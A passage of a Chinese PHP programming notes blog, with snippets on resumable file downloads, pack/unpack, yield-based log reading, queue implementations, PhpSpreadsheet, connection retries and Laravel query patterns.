$ranges[<span class="string">'end'</span>], $file_size));</span><br><span class="line">                <span class="comment">// fp指针跳到断点位置  </span></span><br><span class="line">                fseek($fp, sprintf(<span class="string">'%u'</span>, $ranges[<span class="string">'start'</span>]));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                header(<span class="string">'HTTP/1.1 200 OK'</span>);</span><br><span class="line">                header(<span class="string">'content-length:'</span>.$file_size);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(!feof($fp))&#123;</span><br><span class="line">                echo fread($fp, round($<span class="keyword">this</span>-&gt;_speed*<span class="number">1024</span>,<span class="number">0</span>));</span><br><span class="line">                ob_flush();</span><br><span class="line">                sleep(<span class="number">1</span>); <span class="comment">// 用于测试,减慢下载速度  </span></span><br><span class="line">            &#125;</span><br><span class="line">            ($fp!=<span class="literal">null</span>) &amp;&amp; fclose($fp);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 设置下载速度</span></span><br><span class="line"><span class="comment">     * @param int $speed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">setSpeed</span>(<span class="params">$speed</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric($speed) &amp;&amp; $speed&gt;<span class="number">16</span> &amp;&amp; $speed&lt;<span class="number">4096</span>)&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_speed = $speed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 获取header range信息</span></span><br><span class="line"><span class="comment">     * @param  int   $file_size 文件大小</span></span><br><span class="line"><span class="comment">     * @return Array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">getRange</span>(<span class="params">$file_size</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset($_SERVER[<span class="string">'HTTP_RANGE'</span>]) &amp;&amp; !empty($_SERVER[<span class="string">'HTTP_RANGE'</span>]))&#123;</span><br><span class="line">            $range = $_SERVER[<span class="string">'HTTP_RANGE'</span>];</span><br><span class="line">            $range = preg_replace(<span class="string">'/[\s|,].*/'</span>, <span class="string">''</span>, $range);</span><br><span class="line">            $range = explode(<span class="string">'-'</span>, substr($range, <span class="number">6</span>));</span><br><span class="line">            <span class="keyword">if</span>(count($range)&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                $range[<span class="number">1</span>] = $file_size;</span><br><span class="line">            &#125;</span><br><span class="line">            $range = array_combine(array(<span class="string">'start'</span>,<span class="string">'end'</span>), $range);</span><br><span class="line">            <span class="keyword">if</span>(empty($range[<span class="string">'start'</span>]))&#123;</span><br><span class="line">                $range[<span class="string">'start'</span>] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(empty($range[<span class="string">'end'</span>]))&#123;</span><br><span class="line">                $range[<span class="string">'end'</span>] = $file_size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $range;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file = <span class="string">'book.zip'</span>;  </span><br><span class="line">$name = time().<span class="string">'.zip'</span>;  </span><br><span class="line">$obj = <span class="keyword">new</span> FileDownload();  </span><br><span class="line">$flag = $obj-&gt;download($file, $name);  </span><br><span class="line"><span class="comment">//$flag = $obj-&gt;download($file, $name, true); // 断点续传  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$flag)&#123;</span><br><span class="line">    echo <span class="string">'file not exists'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="字节处理函数pack-unpack"><a href="#字节处理函数pack-unpack" class="headerlink" title="字节处理函数pack unpack"></a>字节处理函数pack unpack</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">将数据打包成二进制字符串https:<span class="comment">//learnku.com/articles/25414#topnav</span></span><br><span class="line">var_dump(pack(<span class="string">'C'</span>, <span class="number">80</span>))<span class="comment">//P</span></span><br><span class="line">var_dump(pack(<span class="string">'C*'</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">80</span>)) <span class="comment">//PHP</span></span><br><span class="line">var_dump(unpack(<span class="string">'C'</span>, <span class="string">'P'</span>))<span class="comment">//[1=&gt;80]</span></span><br><span class="line">var_dump(unpack(<span class="string">'C*'</span>, <span class="string">'PHP'</span>)) <span class="comment">//</span></span><br><span class="line">unpack(<span class="string">'H*hello/C*world'</span>, <span class="string">'PHP'</span>)</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">     <span class="string">"hello"</span> =&gt; <span class="string">"504850"</span>,</span><br><span class="line">     <span class="string">"world1"</span> =&gt; <span class="number">80</span>,</span><br><span class="line">     <span class="string">"world2"</span> =&gt; <span class="number">72</span>,</span><br><span class="line">     <span class="string">"world3"</span> =&gt; <span class="number">80</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">unpack(<span class="string">'H*/C*'</span>, <span class="string">'PHP'</span>)</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">     <span class="number">1</span> =&gt; <span class="number">80</span>,</span><br><span class="line">     <span class="number">2</span> =&gt; <span class="number">72</span>,</span><br><span class="line">     <span class="number">3</span> =&gt; <span class="number">80</span>,</span><br><span class="line">]</span><br><span class="line">$pack = unpack(<span class="string">'C*'</span>, <span class="string">'\x00\x10'</span>)</span><br><span class="line"></span><br><span class="line">$tmp = array_map(<span class="function"><span class="keyword">function</span> (<span class="params">$val</span>) </span>&#123;</span><br><span class="line">        $val = base_convert($val, <span class="number">10</span>, <span class="number">2</span>);</span><br><span class="line">        $val = str_pad($val, <span class="number">8</span>, <span class="number">0</span>, STR_PAD_LEFT);</span><br><span class="line">        <span class="keyword">return</span> $val;</span><br><span class="line">    &#125;, $pack);</span><br><span class="line"></span><br><span class="line">echo implode(<span class="string">' '</span>, $tmp);</span><br><span class="line"></span><br><span class="line"><span class="number">01011100</span> <span class="number">01111000</span> <span class="number">00110000</span> <span class="number">00110000</span> <span class="number">01011100</span> <span class="number">01111000</span> <span class="number">00110001</span> <span class="number">00110000</span></span><br></pre></td></tr></table></figure>
<h3 id="文件yield"><a href="#文件yield" class="headerlink" title="文件yield"></a>文件yield</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取所有符合条件的日志内容https://learnku.com/laravel/t/25396#reply83796</span></span><br><span class="line"><span class="comment">     *https://github.com/y-ui/laravel-running-time/blob/master/src/Commands/RunningTimeCommand.php</span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">getLogFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $files = [];</span><br><span class="line">        $days = $<span class="keyword">this</span>-&gt;end-&gt;diff($<span class="keyword">this</span>-&gt;start)-&gt;format(<span class="string">'%a'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($n = <span class="number">0</span>; $n &lt;= $days; $n++) &#123;</span><br><span class="line">            $files[] = $<span class="keyword">this</span>-&gt;logPath . <span class="string">'/'</span> . $<span class="keyword">this</span>-&gt;start-&gt;format(<span class="string">'Y-m-d'</span>) . <span class="string">'.log'</span>;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;start-&gt;modify(<span class="string">'+1 days'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $contents = [];</span><br><span class="line">        foreach ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists($file)) &#123;</span><br><span class="line">                <span class="comment">//默认还是使用file函数读取，但是使用yield，有效减少了多个日志文件统计时的内存开销，因为数据越多使用fgets花费时间越多，400W数据时 时间差达到了100%</span></span><br><span class="line">                <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;option(<span class="string">'lessMemory'</span>)) &#123;</span><br><span class="line">                    $fp = fopen($file, <span class="string">'r'</span>);</span><br><span class="line">                    <span class="keyword">while</span> (($line = fgets($fp)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                        <span class="keyword">yield</span> $line;</span><br><span class="line">                    &#125;</span><br><span class="line">                    fclose($fp);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">yield</span> file($file);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line">$logs = $<span class="keyword">this</span>-&gt;getLogFiles();</span><br><span class="line">        $pathTimes = $times = [];</span><br><span class="line">        foreach ($logs <span class="keyword">as</span> $log) &#123;</span><br><span class="line">            list($time, $path) = explode(<span class="string">'||'</span>, rtrim($log));</span><br><span class="line">            <span class="keyword">if</span> (!isset($pathTimes[$path])) &#123;</span><br><span class="line">                $pathTimes[$path] = [</span><br><span class="line">                    <span class="string">'path'</span> =&gt; $path,</span><br><span class="line">                    <span class="string">'max'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'min'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'count'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'total'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                ];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($time &gt; $pathTimes[$path][<span class="string">'max'</span>]) $pathTimes[$path][<span class="string">'max'</span>] = $time;</span><br><span class="line">            <span class="keyword">if</span> ($time &lt; $pathTimes[$path][<span class="string">'min'</span>]) $pathTimes[$path][<span class="string">'min'</span>] = $time;</span><br><span class="line">            ++$pathTimes[$path][<span class="string">'count'</span>];</span><br><span class="line">            $pathTimes[$path][<span class="string">'total'</span>] += $time;</span><br><span class="line">        &#125;</span><br><span class="line">           register_shutdown_function(__NAMESPACE__ . <span class="string">'\RunningTimeCommand::errorHandle'</span>);</span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">errorHandle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $error = error_get_last();</span><br><span class="line">        <span class="keyword">if</span> ($error &amp;&amp; stripos($error[<span class="string">'message'</span>], <span class="string">'Allowed memory size of'</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            echo <span class="string">"\n Warnning: Out of memory! you can run command with --lessMemory to reduce memory usage\n"</span>;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">队列是一种特殊的线性表(链表)，特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作(FIFO)，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。</span><br><span class="line"> 队列是先进先出https:<span class="comment">//learnku.com/articles/25814</span></span><br><span class="line">队列中数据元素之间的关系是一对一的关系，即除了第一个和最后一个数据元素之外，其它数据元素都是首尾相接的。</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">    public $data;</span><br><span class="line">    public $next;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data,$next=null</span>)</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = $data;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;next = $next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span></span>&#123;</span><br><span class="line">    public $front = <span class="literal">null</span>;</span><br><span class="line">    public $rear = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    public $size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $n = <span class="keyword">new</span> Node($data);</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;front == <span class="literal">null</span> &amp;&amp; $<span class="keyword">this</span>-&gt;rear == <span class="literal">null</span>)&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;front = $n;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;rear = $n;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;rear-&gt;next = $n;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;rear  = $n;</span><br><span class="line">        &#125;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">shift</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;front)&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;size--;</span><br><span class="line">            $data = $<span class="keyword">this</span>-&gt;front-&gt;data;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;front = $<span class="keyword">this</span>-&gt;front-&gt;next;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $s = new Queue();</span></span><br><span class="line"><span class="comment">// $s-&gt;push("aaaa");</span></span><br><span class="line"><span class="comment">// $s-&gt;push("bb");</span></span><br><span class="line"><span class="comment">// $s-&gt;push("cc");</span></span><br><span class="line"><span class="comment">// $s-&gt;push("dd");</span></span><br><span class="line"><span class="comment">// $s-&gt;push("fifo");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// // echo $s-&gt;shift();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// while($data = $s-&gt;shift())&#123;</span></span><br><span class="line"><span class="comment">//  echo $data."&lt;br&gt;";</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数组实现队列https://learnku.com/articles/25814</span></span><br><span class="line"><span class="comment">// $arr = [];</span></span><br><span class="line"><span class="comment">// array_push($arr,"张三");</span></span><br><span class="line"><span class="comment">// array_push($arr,"李四");</span></span><br><span class="line"><span class="comment">// array_push($arr,"王五");</span></span><br><span class="line"><span class="comment">// array_push($arr,"王六");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// while($data  = array_shift($arr))&#123;</span></span><br><span class="line"><span class="comment">//  echo $data."&lt;br&gt;";</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">//数组实现队列</span></span><br><span class="line"> $arr = [];<span class="comment">//定义一个数组队列</span></span><br><span class="line"> array_push($arr,<span class="string">"张三"</span>);<span class="comment">//压入到队列尾部</span></span><br><span class="line"> array_push($arr,<span class="string">"李四"</span>);</span><br><span class="line"> array_push($arr,<span class="string">"王五"</span>);</span><br><span class="line"> array_push($arr,<span class="string">"王六"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span>($data  = array_shift($arr))&#123;<span class="comment">//从头部弹出一个队列数据</span></span><br><span class="line">    echo $data.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="PhpSpreadsheet-实现读取写入-Execl"><a href="#PhpSpreadsheet-实现读取写入-Execl" class="headerlink" title="PhpSpreadsheet 实现读取写入 Execl"></a>PhpSpreadsheet 实现读取写入 Execl</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> phpoffice/phpspreadsheet</span><br><span class="line"><span class="built_in">require</span><span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">usePhpOffice\PhpSpreadsheet\Spreadsheet;</span><br><span class="line">usePhpOffice\PhpSpreadsheet\Writer\Xlsx;</span><br><span class="line">https:<span class="comment">//laravelacademy.org/post/19518.html</span></span><br><span class="line"> $spreadsheet = <span class="keyword">new</span> Spreadsheet();</span><br><span class="line"> $sheet = $spreadsheet-&gt;getActiveSheet();</span><br><span class="line"> $sheet-&gt;setCellValue(<span class="string">'A1'</span>, <span class="string">'Hello World !'</span>);$writer = <span class="keyword">new</span> Xlsx($spreadsheet);</span><br><span class="line"> $writer-&gt;save(<span class="string">'hello world.xlsx'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="重试机制"><a href="#重试机制" class="headerlink" title="重试机制"></a>重试机制</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$retry = <span class="number">2</span>;<span class="comment">//http://liuxiaochun.cn/2018/08/10/php-mongoclient-no-candidate-servers-found-%E5%88%86%E6%9E%90/</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $mongo = <span class="keyword">new</span> MongoClient(<span class="string">"mongodb://127.0.0.1:27018"</span>,</span><br><span class="line">                      array(</span><br><span class="line">                   <span class="string">'replicaSet'</span> =&gt; <span class="string">'rs0'</span>,</span><br><span class="line">                           <span class="string">'connect'</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">                           <span class="string">'connectTimeoutMS'</span> =&gt; <span class="number">10000</span></span><br><span class="line">                ));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(MongoException $e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == $retry--) &#123;</span><br><span class="line">            <span class="comment">//log</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span>($retry);</span><br></pre></td></tr></table></figure>
<h3 id="laravel-first-更新不成功"><a href="#laravel-first-更新不成功" class="headerlink" title="laravel first 更新不成功"></a>laravel first 更新不成功</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$user =user::where(<span class="string">'id'</span>,<span class="number">2</span>)-&gt;first([<span class="string">'name'</span>,<span class="string">'age'</span>]);</span><br><span class="line">$user-&gt;name=<span class="string">'php'</span></span><br><span class="line">$user-&gt;save();</span><br><span class="line"><span class="comment">//正确</span></span><br><span class="line">$user =user::where(<span class="string">'id'</span>,<span class="number">2</span>)-&gt;first([<span class="string">'name'</span>,<span class="string">'id'</span>]);</span><br><span class="line">$user-&gt;name=<span class="string">'php'</span></span><br><span class="line">$user-&gt;save();</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-关联查询限制条数"><a href="#Laravel-关联查询限制条数" class="headerlink" title="Laravel 关联查询限制条数"></a>Laravel 关联查询限制条数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">`u`</span>.<span class="string">`id`</span>,<span class="string">`u`</span>.<span class="string">`name`</span>,<span class="string">`num`</span> <span class="keyword">from</span> <span class="string">`users`</span> <span class="keyword">as</span> <span class="string">`u`</span> left join (select <span class="string">`user_id`</span>,count(*) <span class="keyword">as</span> <span class="string">`num`</span> <span class="keyword">from</span> books group by <span class="string">`user_id`</span>) <span class="keyword">as</span> <span class="string">`b`</span> on <span class="string">`u`</span>.id = <span class="string">`b`</span>.user_id</span><br><span class="line">select distinct <span class="string">`u`</span>.<span class="string">`id`</span>,<span class="string">`u`</span>.<span class="string">`name`</span>,IFNULL( <span class="string">`b`</span>.<span class="string">`num`</span>, <span class="number">0</span> ) AS num <span class="keyword">from</span> <span class="string">`users`</span> <span class="keyword">as</span> <span class="string">`u`</span> left join (select <span class="string">`user_id`</span>,count(*) <span class="keyword">as</span> <span class="string">`num`</span> <span class="keyword">from</span> books group by <span class="string">`user_id`</span>) <span class="keyword">as</span> <span class="string">`b`</span> on <span class="string">`u`</span>.id = <span class="string">`b`</span>.user_id</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">test3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//统计出所有内部员工的user_id https://learnku.com/articles/25944</span></span><br><span class="line">    $user_ids = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">    $users = User::selectRaw(<span class="string">'u.id,IFNULL( b.number, 0 ) AS number'</span>)</span><br><span class="line">        -&gt;<span class="keyword">from</span>(<span class="string">'users as u'</span>)</span><br><span class="line">        -&gt;distinct()</span><br><span class="line">        -&gt;whereIn(<span class="string">'id'</span>, $user_ids)</span><br><span class="line">        -&gt;leftJoin(<span class="string">'books as b'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">$join</span>) <span class="title">use</span>(<span class="params">$user_ids</span>)</span>&#123;</span><br><span class="line">               $join-&gt;selectRaw(<span class="string">'user_id,count(*) as number'</span>)-&gt;whereIn(<span class="string">'user_id'</span>, $user_ids)-&gt;groupBy(<span class="string">'user_id'</span>)-&gt;on(<span class="string">'u.id'</span>, <span class="string">'='</span>, <span class="string">'b.user_id'</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        -&gt;get();</span><br><span class="line">    <span class="keyword">return</span> $users;</span><br><span class="line">&#125;</span><br><span class="line">Unknown column <span class="string">'b.number'</span> <span class="keyword">in</span> <span class="string">'field list'</span> (SQL: select distinct u.id,IFNULL( b.number, <span class="number">0</span> ) AS number <span class="keyword">from</span> <span class="string">`users`</span> <span class="keyword">as</span> <span class="string">`u`</span> left join <span class="string">`books`</span> <span class="keyword">as</span> <span class="string">`b`</span> on <span class="string">`user_id`</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>) and <span class="string">`u`</span>.<span class="string">`id`</span> = <span class="string">`b`</span>.<span class="string">`user_id`</span> where <span class="string">`id`</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">test2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//统计出所有内部员工的user_id</span></span><br><span class="line"></span><br><span class="line">    $user_ids = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    $bookQuery = Book::selectRaw(<span class="string">'user_id,count(*) as number'</span>)-&gt;whereIn(<span class="string">'user_id'</span>, $user_ids)-&gt;groupBy(<span class="string">'user_id'</span>); <span class="comment">//制作一个query builder</span></span><br><span class="line"></span><br><span class="line">    $users = User::selectRaw(<span class="string">'u.id,IFNULL( b.number, 0 ) AS number'</span>)</span><br><span class="line">        -&gt;<span class="keyword">from</span>(<span class="string">'users as u'</span>)</span><br><span class="line">        -&gt;distinct()</span><br><span class="line">        -&gt;whereIn(<span class="string">'id'</span>, $user_ids)</span><br><span class="line">        -&gt;leftJoin(\DB::raw(<span class="string">"(&#123;$bookQuery-&gt;toSql()&#125;) as b"</span>),<span class="function"><span class="keyword">function</span> (<span class="params">$join</span>) 